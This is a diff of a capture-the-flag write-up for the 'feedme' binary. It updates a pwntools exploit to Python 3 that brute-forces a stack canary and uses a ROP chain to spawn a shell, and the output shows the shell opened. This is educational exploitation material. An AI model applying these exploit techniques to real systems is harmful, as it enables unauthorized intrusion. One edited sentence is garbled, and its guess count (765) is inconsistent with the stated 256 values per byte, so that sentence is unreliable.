@@ -25,7 +25,7 @@ FEED ME!
 15935728
 ```
 
-So we can see that we are dealing with a 32 bit statically linked binary, with a Non-Executable stack. When we run it, the program prompts us with `FEED ME!` and we can give input. We also see that we are able to overwrite a stack canary, so we probably have a stack buffer overflow somewhere. In addition to that, when it detected that the stack canary was overwritten it terminated the process, however continued asking us for input. The binary is probably designed in such a way that it spawns child processes which is where we scan in the input and overwrite the stack canary. That way when the program sees that the stack canary has been edited and terminates the process, the parent process spawns another instance and continues asking us for input. Also one more thing, the reason why pwntools says it doesn't have a stack canary is because pwntools looks for a libc call that due to how it was compiled it isn't maid.
+So we can see that we are dealing with a 32 bit statically linked binary, with a Non-Executable stack. When we run it, the program prompts us with `FEED ME!` and we can give input. We also see that we are able to overwrite a stack canary, so we probably have a stack buffer overflow somewhere. In addition to that, when it detected that the stack canary was overwritten it terminated the process, however continued asking us for input. The binary is probably designed in such a way that it spawns child processes which is where we scan in the input and overwrite the stack canary. That way when the program sees that the stack canary has been edited and terminates the process, the parent process spawns another instance and continues asking us for input. Also one more thing, the reason why pwntools says it doesn't have a stack canary is because pwntools looks for a libc call that due to how it was compiled it isn't made.
 
 ### Reversing
 
@@ -781,9 +781,9 @@ Stack level 0, frame at 0xffffd020:
 We can see that our input is being scanned in starting at `0xffffcfec`. We can see that the return address is at `0xffffd01c`. We can also see that the stack canary is `0x6e6a7000` at `0xffffd00c` (we can tell this since stack canaries in `x86` are 4 byte random values, with the last value being a null byte). Doing a bit of python math we can find the offsets:
 
 ```
-$    python
-Python 2.7.15+ (default, Nov 27 2018, 23:36:35)
-[GCC 7.3.0] on linux2
+$    python3
+Python 3.8.10 (default, Sep 28 2021, 16:10:42)
+[GCC 9.3.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> hex(0xffffd01c - 0xffffcfec)
 '0x30'
@@ -791,7 +791,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 '0x20'
 ```
 
-So we can see that the offset to the stack canary is `0x20` bytes, and that the offset to the return address is `0x30` bytes. Both are well within the reach of our buffer overflow. Lastly let's see where the `feedMeFunc` function is called. We can see the backtrace using gdb:
+So we can see that the offset to the stack canary is `0x20` bytes, and that the offset to the return address is `0x30` bytes. Both are well within the reach of our buffer overflow. Lastly, let's see where the `feedMeFunc` function is called. We can see the backtrace using gdb:
 
 ```
 gef➤  r
@@ -897,7 +897,7 @@ So we can see it is calling the function responsible for setting up a child proc
 
 So we have the ability to overwrite the return address. The only thing stopping us other than the NX is the stack canary. However we can brute force it. Thing is, all of the child processes will share the same canary. For the canary it will have 4 bytes, one null byte and three random bytes (so only three bytes that we don't know).
 
-What we can do is overwrite the stack canary one byte at a time. The byte we overwrite it with will essentially be a guess. If the child process dies we know that it was incorrect, and if it doesn't, then we will know that our guess was correct. There are `256` different values that byte be, and since there are three bytes we are guessing that gives us `256*3 = 768` possible guesses to guess every combination if we guess one byte at a time (which can be done by only overwriting one byte at a time). With that we can deal with the stack canary.
+What we can do is overwrite the stack canary one byte at a time. The byte we overwrite it with will essentially be a guess. If the child process dies we know that it was incorrect, and if it doesn't, then we will know that our guess was correct. There are `256` different values that one byte be can, and since there are three bytes we are guessing that gives us `0xff*3 = 765` possible guesses to guess every combination if we guess one byte at a time (which can be done by only overwriting one byte of the canary at a time). With that we can deal with the stack canary.
 
 #### ROP Chain
 
@@ -906,7 +906,7 @@ After that, we will have the stack canary and nothing will be able to stop us fr
 First we look for ROP gadgets using the tool ROPgadget (since this is a statically linked binary, there will be a lot of gadgets):
 
 ```
-$    python ROPgadget.py --binary feedme
+$    python3 ROPgadget.py --binary feedme | less
 ```
 
 Looking through the list of ROP gadgets, we see a few useful gadgets:
@@ -939,7 +939,7 @@ This gadget is so we can control the value of the ecx register. Unfortunately th
 0x08049761 : int 0x80
 ```
 
-This gadget is a syscall, which will allow us to make a syscall to the kernell to get a shell (to get a syscall in x86, you can call int 0x80). Syscall will expect three arguments, the interger 11 in eax for the syscall number, the bss address 0x80eb928 in the ebx register for the address of the command, and the value 0x0 in ecx and edx registers (syscall will look for arguments in those registers, however we don't need them so we should just set them to null). For more info on syscalls check out https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
+This gadget is a syscall, which will allow us to make a syscall to the kernell to get a shell (to get a syscall in x86, you can call int 0x80). Syscall will expect three arguments, the integer 11 in eax for the syscall number, the bss address 0x80eb928 in the ebx register for the address of the command, and the value 0x0 in ecx and edx registers (syscall will look for arguments in those registers, however we don't need them so we should just set them to null). For more info on syscalls check out https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
 
 Now we are going to have to write the string /bin/sh somewhere in memory, at an address that we know in order to pass it as an argument it the syscall. What we can do for this, is to write it to the bss address `0x80eb928`. Since it is in the bss, it will have a static address, so we don't need an infoleak to write to and call it.
 
@@ -983,7 +983,7 @@ from pwn import *
 # Here is the function to brute force the canary
 def breakCanary():
     # We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
-    known_canary = "\x00"
+    known_canary = b"\x00"
     # Ascii representation of the canary
     hex_canary = "00"
     # The current canary which will be incremented
@@ -993,21 +993,21 @@ def breakCanary():
     # Iterate 3 times for the three bytes we need to brute force
     for j in range(0, 3):
         # Iterate up to 0xff times to brute force all posible values for byte
-        for i in xrange(0xff):
+        for i in range(0xff):
             log.info("Trying canary: " + hex(canary) + hex_canary)
             
             # Send the current input size
-            target.send(p32(inp_bytes)[0])
+            target.send(p32(inp_bytes)[0].to_bytes(1, byteorder='little'))
 
             # Send this iterations canary
-            target.send("0"*0x20 + known_canary + p32(canary)[0])
+            target.send(b"0"*0x20 + known_canary + p32(canary)[0].to_bytes(1, byteorder='little'))
 
             # Scan in the output, determine if we have a correct value
-            output = target.recvuntil("exit.")
-            if "YUM" in output:
+            output = target.recvuntil(b"exit.")
+            if b"YUM" in output:
                 # If we have a correct value, record the canary value, reset the canary value, and move on
-                print "next byte is: " + hex(canary)
-                known_canary = known_canary + p32(canary)[0]
+                print("next byte is: " + hex(canary))
+                known_canary = known_canary + p32(canary)[0].to_bytes(1, byteorder='little')
                 inp_bytes = inp_bytes + 1
                 new_canary = hex(canary)
                 new_canary = new_canary.replace("0x", "")
@@ -1033,39 +1033,39 @@ log.info("The canary is: " + hex(canary))
 # Now that we have the canary, we can start making our final payload
 
 # This will cover the space up to, and including the canary
-payload = "0"*0x20 + p32(canary)
+payload = b"0"*0x20 + p32(canary)
 
 # This will cover the rest of the space between the canary and the return address
-payload += "1"*0xc
+payload += b"1"*0xc
 
 # Start putting together the ROP Chain
 
 # This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
-payload += p32(0x080bb496)    # pop eax ; ret
-payload += p32(0x80eb928)    # bss address
-payload += p32(0x0806f34a)    # pop edx
-payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
-payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
+payload += p32(0x080bb496)  # pop eax ; ret
+payload += p32(0x80eb928)   # bss address
+payload += p32(0x0806f34a)  # pop edx
+payload += p32(0x6e69622f)  # /bin string in hex, in little endian
+payload += p32(0x0807be31)  # mov dword ptr [eax], edx ; ret
 
 # Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
-payload += p32(0x080bb496)    # pop eax ; ret
-payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
-payload += p32(0x0806f34a)    # pop edx
-payload    += p32(0x0068732f)    # /sh string in hex, in little endian
-payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
+payload += p32(0x080bb496)  # pop eax ; ret
+payload += p32(0x80eb928 + 0x4) # bss address + 0x4 to write after '/bin'
+payload += p32(0x0806f34a)  # pop edx
+payload += p32(0x0068732f)  # /sh string in hex, in little endian
+payload += p32(0x0807be31)  # mov dword ptr [eax], edx ; ret
 
 # Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
-payload += p32(0x080bb496)    # pop eax ; ret
-payload += p32(0xb)            # 11
-payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
-payload += p32(0x0)            # 0x0
-payload += p32(0x80eb928)    # bss address
-payload += p32(0x0806f34a)    # pop edx ; ret
-payload += p32(0x0)            # 0x0
-payload += p32(0x8049761)    # syscall
+payload += p32(0x080bb496)  # pop eax ; ret
+payload += p32(0xb)         # 11
+payload += p32(0x0806f371)  # pop ecx ; pop ebx ; ret
+payload += p32(0x0)         # 0x0
+payload += p32(0x80eb928)   # bss address
+payload += p32(0x0806f34a)  # pop edx ; ret
+payload += p32(0x0)         # 0x0
+payload += p32(0x8049761)   # syscall
 
 # Send the amount of bytes for our payload, and the payload itself
-target.send("\x78")
+target.send(b"\x78")
 target.send(payload)
 
 # Drop to an interactive shell
@@ -1075,8 +1075,8 @@ target.interactive()
 When we run the exploit:
 
 ```
-$    python exploit.py
-[+] Starting local process './feedme': pid 16881
+$    python3 exploit.py
+[+] Starting local process './feedme': pid 5224
 [*] Trying canary: 0x000
 [*] Trying canary: 0x100
 [*] Trying canary: 0x200
@@ -1086,29 +1086,26 @@ $    python exploit.py
 [*] Trying canary: 0x600
 [*] Trying canary: 0x700
 [*] Trying canary: 0x800
-[*] Trying canary: 0x900
 
 .    .    .
 
-[*] Trying canary: 0xcfcb2200
-[*] Trying canary: 0xd0cb2200
-[*] Trying canary: 0xd1cb2200
-[*] Trying canary: 0xd2cb2200
-[*] Trying canary: 0xd3cb2200
-[*] Trying canary: 0xd4cb2200
-[*] Trying canary: 0xd5cb2200
-next byte is: 0xd5
-[*] The canary is: 0xd5cb2200
+[*] Trying canary: 0xd6994e00
+[*] Trying canary: 0xd7994e00
+next byte is: 0xd7
+[*] The canary is: 0xd7994e00
 [*] Switching to interactive mode
 
 FEED ME!
 ATE 30303030303030303030303030303030...
 $ w
- 01:49:06 up  4:22,  1 user,  load average: 1.47, 1.31, 1.31
+ 18:04:57 up  1:54,  1 user,  load average: 0.78, 0.52, 0.34
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               21:26   ?xdm?  26:56   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+guyinatu :0       :0               16:17   ?xdm?   5:10   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
 $ ls
 core  exploit.py  feedme  readme.md
+$
+[*] Interrupted
+[*] Stopped process './feedme' (pid 5224)
 ```
 
 Just like that, we popped a shell!
